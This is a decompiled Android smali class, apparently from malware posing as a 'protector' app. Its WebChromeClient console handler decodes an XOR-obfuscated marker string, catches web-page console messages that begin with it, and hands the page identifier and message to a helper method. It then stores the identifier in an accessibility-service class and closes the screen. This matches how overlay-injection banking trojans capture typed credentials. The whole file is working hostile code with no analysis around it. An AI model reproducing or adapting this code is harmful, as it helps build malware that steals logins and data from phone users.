.class public Lcom/icontrol/protector/Webjector$b;
.super Landroid/webkit/WebChromeClient;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/icontrol/protector/Webjector;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "b"
.end annotation


# instance fields
.field final synthetic a:Lcom/icontrol/protector/Webjector;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/Webjector;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/Webjector$b;->a:Lcom/icontrol/protector/Webjector;

    invoke-direct {p0}, Landroid/webkit/WebChromeClient;-><init>()V

    return-void
.end method


# virtual methods
.method public onConsoleMessage(Landroid/webkit/ConsoleMessage;)Z
    .locals 2

    invoke-virtual {p1}, Landroid/webkit/ConsoleMessage;->message()Ljava/lang/String;

    move-result-object p1

    const/16 v0, 0xc

    :try_start_0
    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/icontrol/protector/Webjector$b;->a:Lcom/icontrol/protector/Webjector;

    iget-object v1, v0, Lcom/icontrol/protector/Webjector;->c:Ljava/lang/String;

    sput-object v1, Lcom/icontrol/protector/AccessServices;->t:Ljava/lang/String;

    iget-object v0, v0, Lcom/icontrol/protector/Webjector;->e:Lntidisestablish/neumonoul/floccinaucinih/s3;

    invoke-virtual {v0, v1, p1}, Lntidisestablish/neumonoul/floccinaucinih/s3;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lcom/icontrol/protector/Webjector$b;->a:Lcom/icontrol/protector/Webjector;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    const/4 p1, 0x1

    return p1

    :array_0
    .array-data 1
        -0x4t
        -0x46t
        -0x58t
        -0x1bt
        -0xdt
        0x66t
        -0xct
        -0x78t
        -0x17t
        -0x5at
        -0x4bt
        -0x4ft
    .end array-data

    :array_1
    .array-data 1
        -0x74t
        -0x38t
        -0x3ft
        -0x75t
        -0x79t
        0x46t
        -0x6ft
        -0x2t
    .end array-data
.end method
